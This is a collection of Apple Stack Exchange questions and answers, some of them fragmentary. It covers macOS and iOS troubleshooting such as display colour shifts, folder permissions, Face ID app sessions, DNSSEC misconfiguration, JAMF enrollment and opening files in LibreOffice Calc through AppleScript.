method is in System Preferences > Displays > Night Shift\nSet to Manual:Turn On Until Tomorrow, then use the slider below to determine the amount of hue-shift.\nThis will, of course, reset every morning.\n\nA late thought - you could maybe do this on the Night Shift Schedule mode - set it to on all the time except five minutes when you'll always be asleep - e.g. 01:05 to 01:00 - I haven't tested how it might treat a 'wrap-around' timer like this, so you'd have to test it.\n\nTo do this 'permanently' [you can switch back whenever you want, but it will stick until you do] Then in System Preferences > Displays > Colour & click Calibrate…\nIn the following window, step through the pages  - you can ignore everything else until you get to Target White Point.\nThis step will allow you to dial in a very similar hue-shift that Night Mode does.\nDisable 'Use Native white point' then drag the slider left… D65 is roughly 'normal daylight' & D50 is 'page white'.\nClick through til the end of the sequence then save with a memorable name & apply it.\nYou will then have one more option in your Display profile list - your new 'redder' display profile. You can switch whenever you like. Each will be remembered until you change your mind.\n\nImage shows Advanced options - you don't need to enable these, you only need Target white point\n\nA: (Posting this as an answer, although it doesn't get you the full way there, because I want to include the screenshot)\nColor Profiles are definitely powerful enough to do this, and a lot more. Once you create a custom profile, it is saved in /Users/bohdan/Library/ColorSync/Profiles/my_profile.icc. The following is what you get by opening the file, and it shows the parameter space of these profiles.\n\nThe bad news is that the ColorSync Utility doesn't allow editing these files. And, also, that I cannot tell you how exactly you would want to change it. But I do remember working on these profiles with some editor bundled with Adobe products, and it was essentially the same as adjusting the curves Photos.app. So finding an editor for icc would be promising.\nTo just get an idea if this might work, you may also want to click through all the default profiles. I did use one that was definitely not intended for my screen for a while because had a soothing cinema-like low-contrast effect.\n\nA: Just came across something else that might be worth a try: there are color filters in Accessibility. They are intended for various specific visual impairments, but maybe one of them just happens to work for your purpose. The Colour Tint filter (pictured), for example, definitely succeeds in blunting whites (but also tints all other colors). \n", "Q: Select by one character using shift + arrow does not work in Terminal After fresh reinstall of macOS (started with High Sierra, not updated up to Big Sur), I am unable to use Shift + ← and Shift + → in Terminal, it returns symbols instead of selecting one character on left or right side.\n\n*\n\n*Shift + ← returns e[1;2C\n\n*Shift + → returns e[1;2D\nI was unable to find fix, I have tried using Terminal and iTerm2.\nHow to fix this?\n//EDIT: Mapping shift-right to \\e[1;2C, and shift-left to \\e[1;2D from this post does not work.\n\nA: TL;DR -\nyou need to add custom settings by going to iTerm Preferences > Profiles > Keys and add your new custom key-bindings.\n\nIn case you're interested to know every step, you should checkout the answer from stackoverflow.com, which in turn refers another answer from superuser sister-site! \nRefer answers by @Merlin and @danylokos in ref answer from stackoverflow\n\nA: iTerm2 > Preferences > Profiles > Keys > Key Mappings > Presets > Terminal.app Compability\n\n", "Q: How to edit an email address on iOS I mistyped someone's email, now I choose \"Send again\"\nBut i can't edit their email address: backspacing selects the entire email and deletes all of it, tapping in the middle of the email selects all of it, and I can't even drag the cursor (force touch or hold space) into the middle of it\nHow can I change an email address that is already entered in the \"to\" field\n\nA: The code turns text into an un-editable address object here.\nI do not believe any shortcut or manipulation allows this.

It's a similar issue to this question: Finder asks for password to move file to trash, except the OP's solution there did not work for me.\nThe annoying part about this is that I cannot delete files from my music player (Clementine) like I used to -- it just gives me an error, so I'm assuming it's related.\nHow can I fix this and revert it back to its original behavior of not needing to prompt every time I move a file to the trash?\nEDIT:\nThanks to the comment below I have the following:\nMacBook-Pro-8:~ shane$  ls -leO@d ~/.Trash ~/Music/Folder_1/ ~/Music/Folder_2/\ndrwx------    7 shane  staff  -  224 Sep  5 13:28 /Users/shane/.Trash\ndrwxrwxr-x@  22 shane  staff  -  704 Jun  2 08:22 /Users/shane/Music/Folder_1/\n    com.apple.macl    72 \n    com.apple.quarantine      57 \ndr-xr-xr-x@ 116 shane  staff  - 3712 Sep  3 17:47 /Users/shane/Music/Folder_2/\n    com.apple.macl    72 \n    com.apple.quarantine      57 \n\nSo it turned out this prompt was only happening in one folder (Folder_2). Obviously it's missing write permissions. I'm just not sure how this happened as I followed the same process for this as the other 10 or so folders that don't have this problem (i.e. download playlist, extract it, move it to the Music directory) -- so something seems to have changed with the default permissions at some point in this process?\n\nA: Troubleshooting: There are a wide variety of things that might cause a problem like this, so the first thing to do is to try to figure out what's causing it in your particular case. And a good first step in troubleshooting is to try to isolate the source of the problem by changing things, and seeing which affect the problem. For instance, does it happen with all files, or only some files (or files in certain folders, or on certain volumes, etc). Create files and/or folders in various places, and try throwing them out. If it happens with only certain files or folders or whatever, it's probably something about those particular files/folders, and you should concentrate on them; if it happens everywhere, it's more likely a general problem (e.g. something with your .Trash folder.)\n(Note: macOS keeps a separate trash folder on each volume -- because you can't put a file that's physically on one volume into a folder (including a trash folder) on a different volume. On the volume where your home folder is, it's ~/.Trash; on other volumes, it's /Volumes/volumename/.Trashes/$UID, where $UID is your user ID number, usually 501.)\nOnce you've got an idea where the problem's coming from, you can get more info about file/folder permissions with ls -leO@ (or ls -leO@d to see a folder's permissions, rather than its contents). Here's an example on my Mac:\n$ ls -leO@d ~/.Trash ~/Desktop\ndrwx------  75 gordon  staff  - 2550 Sep  5 02:03 /Users/gordon/.Trash\ndrwx------@ 62 gordon  staff  - 2108 Aug 31 00:59 /Users/gordon/Desktop\n    com.apple.FinderInfo      32 \n 0: group:everyone deny delete\n\nI won't go into detail here, but the rwx------ bit is the regular unix permissions; gordon  staff is the owner and group; the - after that is flags (- means none; uchg means it's locked) the com.apple.FinderInfo line is an extended attribute, and the 0: group:everyone deny delete is an access control entry.\n(The deny delete access control is normal here, it's just to keep people from deleting their Desktop folder by mistake. It only applies to the Desktop folder itself, not its contents. Well, unless it had an inherit attribute, but it doesn't.)\nIn this case, it looks like the permissions are messed up on a specific folder:\n...\ndr-xr-xr-x@ 116 shane  staff  - 3712 Sep  3 17:47 /Users/shane/Music/Folder_2/\n    com.apple.macl    72 \n    com.apple.quarantine      57 \n\nThat dr-x at the beginning means it's a directory (aka folder), and the owner (shane) has Read and eXecute (actually search... long story) permissions, but not Write. Write access on a folder controls making changes to its contents: creating/moving files, renaming files, and deleting files. You should almost always have write access to your own stuff.\nFortunately, it's easy to add write access:\nchmod u+w /Users/shane/Music/Folder_2/\n\nThe u+w bit here means \"for the user (i.e. the owner), add write access\".\nI have no idea what would've caused those weird permissions in the first place, but hopefully that's the only problem and this'll solve it.\n", "Q: How to turn off sounds for everything except alarm To make sure my alarm will wake me up, I turn the ringer volume up to max and turn my iPhone off of silent.\nThis results in keyboard clicks, notifications, screenshots etc. being unbearably loud.

In some cases this is actually what I want (I don't need all my old messages with verification codes), but in other cases I just want to  hide conversations that are inactive, but not lose all the old messages completely.\nDid they remove this option completely, or is there a hidden option to restore it?\n\nA: Apparently the \"Delete Conversation\" command actually does what the old \"x\" button did.

Can I somehow fix it?\n\nA: This, I'm afraid, is the default behaviour for all modern battery-powered mice, not just Apple's.*\nTo save power they sleep after a very short period of inactivity & need to be woken again before they'll respond.\nEmpirically, I've noticed that mouse movement achieves this faster than any more advanced movement such as scrolling.\nI see no workaround, other than abandoning wireless mice & returning to wired.\n*Obviously, I haven't tested every mouse in the world but we have an assortment of Apple & Logitech devices here, all of which exhibit this behaviour.\n", "Q: Is Apple Wallet associated with an Apple ID or device? I have always been a little wary of Apple Wallet, because the Apple documentation is so sparse. It doesn't address some fundamental questions, such as whether the wallet is associated with the iPhone or Apple ID.\nWhy do I care about this? Well, I know I can login to a primary Apple ID on an iPhone, and various data will be associated with the Apple ID. Some of it may be synchronised also, e.g., iCloud documents. \"Find my ..\", Safari bookmarks, etc., may be synchronised too. And I know that in some cases, like the App Store, you can login with a different Apple ID and it uses that app, associated with that other Apple ID.\nIt appeared that Apple Wallet might be different, as there doesn't seem to be the option to associate it with a different Apple ID in the same way that you can do that for App Store. However, I just noticed that my personal phone contains passes in its Apple Wallet that were definitely not from me. I suspect this may have been from some time in the past when I logged in to a shared company Apple ID, but now I'm worried that the sharing may have gone the other way around too, and my credit card may now be available for use on other devices that happened to login to that shared company Apple ID?\nOr it may be that payment cards are treated separately from the rest of the passes in the Apple Wallet? (so only passes get shared in the manner described above?)\n\nA: For the passes, someone may have shared a pass with you and you then added it by accident, or you just unknowingly chose to add one. I'm unaware of passes syncing, but then again, I don't have two phones.\nFor credit cards though, I'll quote Apple's documentation:\n\nAfter your card is approved, your bank, your bank’s authorised service provider or your card issuer creates a device-specific Device Account Number, encrypts it and sends [...] to Apple. The Device Account Number can’t be decrypted by Apple but is stored in the Secure Element — an industry-standard, certified chip designed to store your payment information safely — on your device. Unlike with usual credit or debit card numbers, the card issuer can prevent its use on a magnetic stripe card, over the phone or on websites. The Device Account Number in the Secure Element is isolated from iOS, watchOS and macOS, is never stored on Apple servers and is never backed up to iCloud.\n\nSo no, your card number is safe and has never been synced.\n", "Q: Goto Out Of Bounds pop-up on iPhone I started getting pop-ups saying \"Goto out of bounds\" when:\n\n*\n\n*Battery died and booted upon charging.\n\n*While on a call, the call disconnected and I'd see the pop-up on screen.\n\nWhat could be the issue?\niPhone 8 running iOS 14.6\n\n\nA: Your phone appears to be displaying a similar interface to the GUI used to display information from a mobile carrier (other examples can be found by calling *3001#12345#*, *#21#, *#43#, etc., though the exact interface may vary).\nIt looks like your phone is receiving data from the cell network that it cannot handle, so, if anything, I'd recommend contacting your carrier, but it isn't really something to be concerned about.\n", "Q: MacBook Pro does not start anymore, only Trackpad responds I used my MacBook Pro (Late 2017) in the recent days, but suddenly it had an unexpected shutdown and the screen went dark. What I saw before the immediate shutdown was a notification, but I wasn’t able to read anymore since the shutdown occurred just a few milliseconds.\nWell since then, I can't start the MacBook anymore. I can press the button and I can feel, that the Trackpad is active, so it is „clickable“. But unfortunately there is no screen turning on or any component running else on the Mac.\nDoes anyone had something similar in the past or is there a keyboard shortcut to get to some recovery tools? I just wanted to ask before I go to a repair store since the warranty has expired.\n\nA: From all the comments and almost all your original symptoms, the failure appears to occur very early in the boot flow, somewhere between power sequencing and early EFI. It would almost certainly be a hardware issue. In any case, there are no readily available ways to debug something that fails that early without additional tools.\nThe only thing that I don't understand is why you're able to click the trackpad. The 2017 model has a haptic trackpad, which means that the only way it's clickable is if (1) it has a regulated power supply and (2) its controller driver is loaded and running. The latter requires late firmware or OS time, either of which would give you visible signs of life. One possible scenario is that your backlight suddenly died and also your sound output is set to zero volume, so that it appears like the machine is dead when it's really not. But the external display would have resolved that...\nIf you have a set of secure Torx screwdrivers, you could try opening up your machine to see if one of the \"power good\" LEDs is lit.

I gave my son my passwords to Fidelity Investments and my Spectrum Internet account. On his phone, he logged into both apps with my passwords and only needed his face (using FaceID) to access those two accounts. However, one day I wanted to take away his access and changed passwords to both of those accounts, yet he continues to have access to my accounts on his phone using just FaceID.\nI thought FaceID ==> gives the phone owner access to the passwords saved on the phone. Now it looks that the phone owner's face gives direct access to once authenticated apps on the phone. Is that how FaceID works? And there's no way for me to revoke his access to my accounts?\n\nA: Apple provides Face ID authentication to apps, but they choose how to use it. When the app uses Face ID (or Touch ID) it requests the system to authenticate the user. The system shows the Face ID prompt and comes back to the app with the result. This is the end of the Face ID process.\nAt this point, the app can do what they want. In the situation you've described, the app is saving the login information and using that information after the system indicates Face ID was successful.\nMost apps have a function to sign out existing users. This might only be presented when changing a password or on the security page at any time. This would log out the application, regardless of the Face ID status.\nIf this function isn't readily available, you must contact the company that produces the app and ask them how to log out everybody using your account.\n\nA: Apps can add support for using Face/TouchID for just authentication, separate from password autofill, if you want to disable that there is almost certainly a setting inside the app to do so.\n", "Q: iPhone - free up photo space for transfer to new phone Sorry to have to add to the bajillion questions about freeing up space on an iPhone, but I can't seem to find one that addresses my particular need.\nI just bought a new iPhone 12 Mini with 128Gb storage, and \"oops\", apparently my old iPhone 8 had 256Gb.  No problem, I thought, it's only about half full anyway, I'll just delete stuff until I'm under whatever nebulous threshold it needs.  There's always some cruft hanging around to delete, I figured.\nWell, apparently the vast majority of space on my phone is taken up by photos:\n\n(Note some oddities - \"Photos\" takes up 106Gb, but everything altogether takes up 44Gb; and the sizing bar shows distinctly more than 50% of storage used, despite being nominally 44Gb.)\nIf I go in and delete individual photos/movies from the Photos app, then they get removed from everywhere (I have iCloud sync turned on), so I don't want that.  Not that I can identify particularly large photos/movies very easily anyway....\nWith iCloud sync turned on, it seems to do a decent job of keeping disk usage below the limits of my current device (presumably through offloading items to iCloud), but I need it to keep usage quite a bit less than that, so I can complete the transfer to my new phone.  After that, presumably it will manage things properly on the new device.\nAny suggestions?\nUpdate\nI thought I was working toward a solution, but now it seems to be stuck at a worse point.  I disabled iCloud Photo sync, then (after waiting a while) my new phone seemed happy enough with the sizes to start transferring things over.  But after it restarted itself and showed my icon screens again, it's refusing to download anything now, most apps are not downloaded yet.  It sat in this state for a few hours, so I decided to restart the phone - now it's just sitting at the big startup Apple logo and won't start.  Urgh.....\nUpdate 2\nI left the new phone to its own devices overnight, stuck in the bootup screen, and by morning it had indeed fully booted up.\n\nA: Here's what seemed to work - it's non-obvious because it seems to require waiting vast amounts of time with no indication that it's going to work.\nSo as I wrote in my (first) update, I disabled iCloud Photo sync.  That helped a little bit, as did deleting various other random stuff, so that the phone-to-phone transfer could proceed.  The new phone was still VERY unhappy because it was right up against its capacity limits, everything was super slow as it tried to perform tasks that require a little disk space elbow room.\nNext, I re-enabled iCloud Photo sync on the new phone.  Nothing really changed, but it started saying that it was uploading photos to iCloud (incredibly slowly).  Over the course of the next couple days, it seemed to make a bit of progress uploading, until suddenly today I'm seeing a MUCH happier storage report:\n\nI think it either made a breakthrough once it decided everything was uploaded, or it was able to free up some space by uploading things and that gradually let it free up more space by uploading, etc. etc. etc.\nI hope this can help someone encountering similar issues.\n", "Q: Why am I able to run my own app without code signing?

Some time ago, I needed to run Mojave, so I partitioned the SSD into 2, 256MB each, and got this running.\n\nI'm having some issues (when powering up, holding the option key doesn't give me boot choices, and getting Mojave running is tedious) and I'd like to wipe the existing Yosemite partition.\nTo me, the brute force method, would be:\n\n*\n\n*Boot from external drive\n\n*Use CCC to clone the Mojave system\n\n*Wipe the SSD 100%, and format as APFS\n\n*Clone the Mojave System back over\n\nBefore I spend the time to do this, my question is:\nIs there a way to resize the Mojave/APFS partition to the whole drive, in place, and wipe out the Yosemite partition?\nI am looking at Disk Utility, and don't see how I'd do this.\nUpdate: I CCC'd an image of the Yosemite drive, and wiped it. Now I see this\n\nI am able to click the \"-\" to remove the Mojave partition, but when I highlight Yosemite, the \"-\" is greyed out. Note: I am booted up from an external drive. Also, when I erased the Yosemite partition I made it APFS, hoping that would help.\nIs there a non-terminal 'next step' I can use?\n\nA: The linked question in the comment was useful. It convinced me that trying to manipulate APFS partitions in place was not going to be easy, and likely not work at all.\nIn the end, I used the process I described in the question, i.e. CCC did a beautiful job making a clone of the drive, I wiped both partitions, but had to reformat to Mac OS extended to re-partition, and then once there was the one partition, reformatted to APFS.\nWhile I like the idea of being to boot into multiple older OS, it's less practical to do it on partitioned drives given how APFS functions.\n", "Q: How to programatically change application's notification settings?

I haven't found the answer by googling.  I'm wondering because I can't make sense of what I see on my M1 MacBook Air when giving it a heavy load of BOINC jobs when on battery vs. plugged in. Screenshots show macOS assigning the four jobs to the same four cores, regardless of power source; I naively expected a difference. No matter what I try, BOINC runs only on the right four cores, never the left four, even when I give it eight jobs. But what are the MenuMeters left and right, performance or efficiency? Is BOINC doing the choosing?\n\n\n\nA: In general the developer of the software can choose (or at least strongly indicate to the operating system) which type of core to use. The developer sets a quality-of-service expectation and the operating system generally follows that.\nIn addition to the developer supplied QoS expectation, the operating system monitors the application's workload over a period of time, as well as the whole system's workload over a period of time, and use heuristics to make an overall decision on whether to schedule a specific thread on a P-core (performance) or E-core (energy).\nNote that applications and background processes are treated differently in this respect. For example a GUI application could be treated differently whether its window(s) are in the foreground or in the background. For background processes (such as BOINC computation) that doesn't apply.\nYou can read a relatively non-technical overview of how it works here:\nhttps://developer.apple.com/news/?id=vk3m204o\nAnd a bit more specifics (but still overview information) about the QoS-classes here:\nhttps://developer.apple.com/documentation/apple-silicon/tuning-your-code-s-performance-for-apple-silicon\nNote that it is actually often possible for you as the user to override the QoS-class set by the developer. Get the PID (process ID) of the BOINC job you want to affect (using for example Activity Monitor) - and then use the taskpolicy command to set a new quality-of-service class.\n\nA: By the load set by you.\nThe more programs or more likely an algorithm that looks at the processor loading based on the activities in progress which brings in more or fewer cores as needed to meet a given performance rating.\nMost processors will max out when provided with mains power and are throttled when on battery for a longer life.\n", "Q: macOS Safari can not delete stored http digest password I enter a site with HTTP authentication, and use my credentials, username and password, and selected \"remember password\" option.\nAfter that, site is always accessible without login, which is ok.

The default configuration of browsers on any platform is to store the cookie until its expiry or until it is removed by the website or user. Because of this browsers will keep you logged-in by default between browser sessions.\nWhat you have described most closely resembles Private Browsing where Safari won't remember the pages you visited, your search history or your AutoFill information, along with those login cookies.

The output is not designed to be 're-entered'.\nMany people do create shell scripts of successive defaults write commands, in order to set up their preferred options after a 'clean' install, or for a new user account, etc. However, it is very difficult, if not impossible, to use the defaults command to create some of the more complex dictionary entries.\nTo me, Time Machine would seem to be the best way to keep on top of things: if something has changed, go back to when it worked.\nThe file association to a default application for that file type is stored in one file:\n~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist\n\nBut bear in mind that preferences are cached, so simply swapping in the file won't work either.\nThere are utilities that can manage the file-app associations, such as SwiftDefaultApps.\nhttps://github.com/Lord-Kamina/SwiftDefaultApps\nIf something is continually changing your default apps for file type, then that is not normal, and something that needs to be investigated further.\n", "Q: NFC Chipset On Apple Devices I have been using my android phone's NFC to refill by public transportation card in Turkey. When I switched to iPhone all the apps and apps providers are telling that there is no NFC support for such action on iOS devices.\nBut I know some apps are capable of reading our electronic, credit card like citizenship cards using NFC. Also some apps on the store claims that they can write to NFC cards.\nDo Apple devices chipsets and OS supports NFC writing or only reading ?\n\nA: Apple's Core NFC is able to write to NFC tags, they even have a sample project with explanations. But as far as I know, NFC support is limited and it looks like payment apps are not allowed to use it:\n\nCore NFC doesn't support payment-related Application IDs.\n\nI didn't spot any obvious reason in the App Store guidelines that would prohibit a public transport app provider from adding NFC support.\n\n*\n\n*It's possible the provider's information is outdated (back from when Core NFC was not available).\n\n*Maybe the specific NFC type is not supported by Apple.\n\n*The provider may not want to give the usual 30% share to Apple (and thus states \"Apple does not support it\").\n\n*Maybe Apple does indeed reject \"pay in app, transfer to NFC\" use. That seems unlikely to me, though.\n\n", "Q: Unknown host only on my mac I was thinking about a DNS issue but now I am waiting for months and I still have the issue.\nOne month ago I configured a domain test.my-domain.com\nBut chrome is returning me DNS_PROBE_FINISHED_NXDOMAIN\nDoing ping test.my-domain.com I have the same issue ping: cannot resolve test.my-domain.com: Unknown host\nPeople from outside can access the website without issues.

You need to fix that at CloudFlare (i.e. at the level of your authoritative DNS service) - it is not a problem with your Mac.\nThe problem with your DNS configuration is that your domain, webtop.blog, is advertised to be protected by DNSSEC - but it is not setup.\nIn simple terms, DNSSEC is used to ensure integrity of DNS responses by using cryptography to sign DNS records at each level of DNS lookups. This ensures that others cannot suddenly takeover your domain and start publishing records for it (for example in a man-in-the-middle attack on a specific network) - DNSSEC-enabled systems would detect that the modified DNS records do not have the right signature, and the lookups would fail.\nIn your case, you have setup CloudFlare to send out DNS responses for your domain - such as for example A records with IP addresses for your web server. However, you have not setup CloudFlare to send out DNSSEC records.\nThis means that the domain fails DNSSEC validation.\nSome systems do not understand DNSSEC or purposely do not validate it, and on these systems your domain will work.\nOn other systems, such as for example Google public DNS (8.8.8.8/8.8.4.4), a failure to provide the correct DNSSEC records means that all lookups will fail.\nYou can find a guide on how to add DNSSEC records to your CloudFlare DNS here:\nhttps://support.cloudflare.com/hc/en-us/articles/360006660072-Setting-up-DNSSEC-in-Cloudflare\nYou can see that your domain is setup for DNSSEC at the registry by a simple DNS lookup from your Mac:\ndig -t ds @a.nic.blog webtop.blog\n\nYou'll find that the reply contains a DNSSEC as listed here:\nwebtop.blog.        3600    IN  DS  16264 8 2 2876E6FCB382D01DDDBEBD7B5DF48D5BF261A4F852DB918CC1AAE1E5 172163E6\n\nHowever, when asking for the DNSSEC records from CloudFlare like this:\ndig -t ds @logan.ns.cloudflare.com webtop.blog\n\nYou'll get no records.\n", "Q: Why can't I find \"Self Service.app\"? I am trying to find this Self Service.app but it is no where to be found. Not on Spotlight, not on /Applications. Everywhere I read about it, it is assumed as a given that it should be there when the mac OS is installed.\nI have Mojave 10.14.3.\nWhat am I missing?\n\nA: That application comes from the MDM provider. When it’s missing, that means the enrollment profile is broken or was removed. You would follow the enrollment process (typically going to a web address and downloading a new copy of the enrollment profile) or contact the help desk to get them to send you a new enrollment.\nWhen you accept the enrollment, that application is one of the first things the MDM delivers to your Mac.\nSince your MDM uses JAMF, you can open terminal and get more details with this command.\nsudo jamf manage\n\nIf the MDM allows your credentials to re-enroll and the jamf binary is still also installed, you can possible re-enroll\n    sudo jamf enroll --prompt\n\n", "Q: Is there a way to make a line break in an alert displayed by Shortcuts?

However, when I do the regular process to associate a file extension to a program using Open With in Finder, the only option is \"LibreOffice\" (not Calc in particular). If I set LibreOffice as the default program for that extension, LibreOffice opens the file with Writer.\nI do not want to change the file extension to some extension already associated with Calc (like, guessing, \".tsv\") because I have lots of this files and I am constantly generating new ones.\nSo, the question is: How do I get to associate a particular file extension with a particular LibreOffice program (Calc)?\n\nA: Calc is not a separate standalone application as in what Excel is in Microsoft Office or like Numbers, which are fully functional standalone applications. As such, there is no default method thru Finder, Get Info and or Open With in macOS to associate a particular file extension with Calc, as it is just not a fully functional standalone application as with the aforementioned applications.\nIn your particular use case, the only practical reason to associate a give file extension with a given application is to be able to either double-click the file or press ⌘O in Finder and have it open in it. As that is not doable by the methods previously mentioned, an alternative is to select the file in Finder and either select a Service/Quick Action or press a keyboard shortcut and have the selected file open in the given application. If one is already in Finder then this certainly is much quicker and easier then going thru the application to open the file.\nThe following example AppleScript code, shown below, can be used in various ways, however, this will focus on creating an Automator Service/Quick Action and also assigning it a keyboard shortcut.\n\n*\n\n*In Automator, create a new Quick Action, as shown in the screen shot below the Notes: section, with the following settings: Workflow receives [no input] in [Finder]\n\n\n*Add a Run AppleScript action, replacing the default code with the example AppleScript code, show below.\n\n\n*Save the Quick Action as e.g.: Open in Calc\n\n\n*Then assign it a keyboard shortcut in System Preferences > Keyboard > Shortcuts > Services, e.g.: ⌃⌥⌘O\n\n\n\n*\n\n*Note: The first time using the Service/Quick Action I recommend not use the keyboard shortcut and after selecting the target file in Finder, then either from Finder > Services click e.g. Open in Calc, or it is available on the context menu, right-click the file and select it from Quick Actions or Services. After dealing with the Security & Privacy related prompts one can then use the keyboard shortcut.\n\n\nExample AppleScript code:\nset selectedItems to {}\n\ntell application id \"com.apple.finder\"\n    set selectedItems to selection as alias list\nend tell\n\nif selectedItems is {} then return\n\nset posixPathOfLibreOffice to ¬\n    the POSIX path of the (path to ¬\n        application id \"org.libreoffice.script\")\n\nset shellCMD to {¬\n    \"'\", posixPathOfLibreOffice, ¬\n    \"/Contents/MacOS/soffice\", \"'\", ¬\n    space, \"--calc\", space} as string\n\nrepeat with thisItem in selectedItems\n    set thisItem to the POSIX path of the contents of thisItem\n    tell application id \"org.libreoffice.script\" to activate\n    do shell script shellCMD & thisItem's quoted form\nend repeat\n\n\nNotes:\nThe example AppleScript code, shown above, was tested in Script Editor and as an Automator Service/Quick Action under macOS Catalina with Language & Region settings in System Preferences set to English (US) — Primary and worked for me without issue1.\n\n*\n\n*1  Assumes necessary and appropriate settings in System Preferences > Security & Privacy > Privacy have been set/addressed as needed.\nThe example AppleScript code can also be used as an AppleScript application and placed in the Toolbar of Finder, thus allowing it to be clicked after selecting the target file. I do this with some of the AppleScript scripts I use daily in Finder as it's the easiest method to automate what manually takes many more steps and time.\nAutomator Service/Quick Action:\n\n\n\n\nNote: The example AppleScript code is just that and sans any included error handling does not contain any additional error handling as may be appropriate. The onus is upon the user to add any error handling as may be appropriate, needed or wanted. Have a look at the try statement and error statement in the AppleScript Language Guide. See also, Working with Errors. Additionally, the use of the delay command may be necessary between events where appropriate, e.g. delay 0.5, with the value of the delay set appropriately.\n", "Q: How do make Cmd + S files save to the file I opened with numbers with its existing format/extension? I usually open .XLSX files with Numbers for quick edit.\nHowever doing Cmd + S makes Numbers prompt to save the file with .numbers extension. How do I override this behavior?\n\nA: Numbers does not open Excel files directly. A new Numbers document is created.\n\n*\n\n*Numbers can convert Excel files to Numbers documents when opened, which is a lossy process, and\n\n*Numbers can export to Excel, which is a lossy process.\n\nSince both steps are lossy, it’s required to be explicit.\n\nA: I would say you must have excel to save a file into excel type, but you could change the extension back to .xlsx with finder or use the export into menu (inside the file menu)\n\n", "Q: How to install an Automator action from unidentified developer?

Had it for 30 days or so and have been accessing the internet via Ethernet since day one without problems - until a couple of days ago. After waking the computer from sleeping suddenly I wasn’t able to access the internet anymore (for the most part - read below). I switched to WiFi and it started working again. Thought it may be the cable so I tried a different cable to no avail. Tried the original cable with my MBP (via Thunderbolt 2 dongle) and that worked fine as well. I power cycled my router, which did not help. So it’s not the cable, switch or router.\nTurned off WiFi and plugged the Ethernet cable back in and turned on VPN (ExpressVPN). Internet works! So WiFi and Ethernet on VPN work fine, but Ethernet on it’s own doesn’t.\nBack to the problem itself which is strange. On a handful of sites, the internet does work on Ethernet. Best Buy, DuckDuckGo (gets search results, but can’t navigate to any of the links), Pocket, Reddit, Goodreads, Amazon (partially loads - probably from cache) seem to work okay (the pages load up but the browser tab icon keeps \"spinning\" for a while). But most other sites just don’t work - Google Sites, Yahoo, Wikipedia, Weather.com, etc. The error specifically is \"Connection Timed Out\"\nThe problem is not isolated to browsing. I opened Spotify and the Apple Podcasts app and they couldn’t connect to the internet either when using plain Ethernet. That said, say I use WiFi to start Spotify and go to a playlist (which works) and then switch to plain Ethernet and click play on a song - it works. If I then try and navigate to another playlist, then it just keeps spinning and times out.\nPinging sites on plain Ethernet works fine. Running traceroute seems to either take a while or timeout on most sites (even ones that work using the browser). This behavior is the same when I'm on WiFi so I'm not sure what that means.\nI tried a few other things individually that didn’t help:\n\n*\n\n*Created a new user\n\n*Started the Mac in Safe Mode\n\n*Did a fresh reinstall of MacOS\n\n*Via Network Preferences, Renewed the DHCP Lease\n\n*Via Network Preferences, Removed and re-added the Ethernet adapter\n\n*Via Network Preferences, Created a new Location (instead of \"Automatic\") and tried the Ethernet adapter\n\n*Connected Ethernet to the computer via a USB-C dongle to the Thunderbolt Port\n\n*Changed the default DNS to Google's DNS servers (8.8.8.8)\n\n*Uninstalled ExpressVPN\n\nDoes anyone know what might be the problem here?\n(Edited to add other things I tried)\n(Edit 2: More specifics added regarding problem)\n\nA: After a number of calls with Apple Support, it turns out that the problem isn't related to my Mac. Discovered that the problem lies with either with my router or ISP with regard to resolving IPv6 addresses. WiFi (and I assume VPN) uses IPv4 to connect. When I updated my IPv6 setting to \"Link-local Only\" (forcing the use of IPv4 for external addresses) it works perfectly over plain Ethernet. Not sure what the downside is of using IPv4 exclusively but so far has not made a difference. Next call to my local ISP support to see what's going on.\n", "Q: How do I construct a terminal process that displays lines as they are added to a log file?

You did not indicate whether you tried to access your data volume via Terminal in Recovery, nor whether you tried to get to Single User Mode (CommandS during boot) so we don't yet know how intact the filesystem is.\nGiven that the root cause of your issue is unknown, we should be conservative and presume that your data is in imminent danger of permanent destruction. This means that the top priority is copying as much of it off the drive as quickly as possible. This seems to be in alignment with your goals.\nIf there is no or minimal filesystem corruption, then Target Disk Mode will generally be successful in allowing you to siphon your data. If corruption is significant, you may need to run Disk First Aid in Recovery first and hope that it can repair the damage. If it cannot, then you will need to use a service like DriverSavers, which to my knowledge is the only shop that's capable of recovering APFS volumes. (I am presuming that your data volume is in APFS format, which is the default for Mojave. If it is instead HFS+, then you can often use DiskWarrior to repair it.)\nSo the answer to both Q1 and Q2 is: It really depends on if & how much your drive is corrupted.\nImportant Note: The more time that the computer is powered on, the greater the risk of further data loss.

A lot of other news sources have similar claims, though it appears most of these were sourced from The National.\nAs an owner of an iPhone SE from 2016, I'm confused now. I've always installed updates for iOS and my phone is currently on iOS 14.7.1. Will my iPhone SE really no longer get WhatsApp updates because it originally shipped with iOS 9, even though I'm currently 5 versions later? Or is this just another fine example of clickbait journalism? I assume it's the latter and that because my phone is on iOS 14, it will still get WhatsApp updates. I mean, even Apple itself is still supporting the iPhone SE with another year of iOS updates, so it would be weird if WhatsApp dropped support.\n\nA: From the WhatsApp FAQ you linked to in the question:\n\nAbout supported iPhones\nWhatsApp for iPhone requires iOS 10 or newer.\nFor the best experience, we recommend you use the latest version of iOS available for your phone.

I’ve noticed that the app switcher doesn’t show screens for the apps but they are shown there (typically with just a blank screen or a solid color screen with the app name/logo). And it seems sometimes iOS just decides to quit apps because for example you re-open the app and they say conversation or article you were looking at is gone, although it hasn’t been deleted (it can be found again.)\nI guess it’s impossible to answer this question without a jailbroken phone?  And The answer is not a simple yes or no even for a given  app?\nI can’t find a definitive answer. (Well, except I asked on discussions.apple.com and the answer from Lawrence Finch User level: Level 10 (141,619 points) is clearly definitively ... wrong and I can't comment on it; it's locked. )\nI know SOME background apps do restart and some do run in the background!\n\n*\n\n*My phone responds when I use a Tile, for example.\n\n\n*Apps that have alarms do sometimes go off. (Frustration over this is what motivated the question.)\n\n\n*Mail gets checked (sometimes push, sometimes on a schedule).\n\n\n*Navigation apps provide alerts even when not in the foreground...\nSo\nin some sense they are running in the background.\nI doubt anyone without a jailbroken phone or developer tools could answer this question based on experience.\n[Edit: I found these settings exist in Xcode, which is mildly informative. ]\n\nA: I think the reason you're having a hard time finding a definitive answer is that the concept of a \"running\" app is different here than many expect. A non-technical user might have one idea of what \"running\" means, an \"old-school\" PC programmer might have a different idea - and then there's what actually happens on iOS, which probably only Apple and app developers really have to deal with.\nOn a traditional PC you'll find that you have a program executable on disk that you start - and now the program is \"running\". Here \"running\" means that the program will expect to have its main thread of execution be 